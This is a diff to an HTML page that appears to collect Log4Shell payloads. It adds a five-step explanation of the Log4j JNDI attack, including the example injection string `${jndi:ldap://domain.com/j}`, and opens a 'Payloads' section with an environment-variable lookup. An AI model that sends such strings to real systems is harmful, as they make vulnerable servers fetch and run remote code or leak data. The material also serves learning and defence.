@@ -194,7 +194,17 @@
                    <script>
                   (adsbygoogle = window.adsbygoogle || []).push({});
                    </script>
-                    </div>
+                    </div><br />
+                    
+                   <h2>#How to works</h2>
+                     <p> 
+1. An attacker inserts the JNDI lookup/payload in a anywhere of request that is likely to be logged. (for instance: `${jndi:ldap://domain.com/j}`)<br>
+2. The payload is passed to log4j for logging.<br>
+3. Log4j interpolates the string and queries the malicious ldap server.<br>
+4. The ldap server responds with directory information that contains the malicious java class.<br>
+5. Java deserializes or download the malicious java class and execute it.<br>
+                    </p>
+                    
 <h2>Payloads</h2>
 <pre><code>
 ${env:JAVA_VERSION}
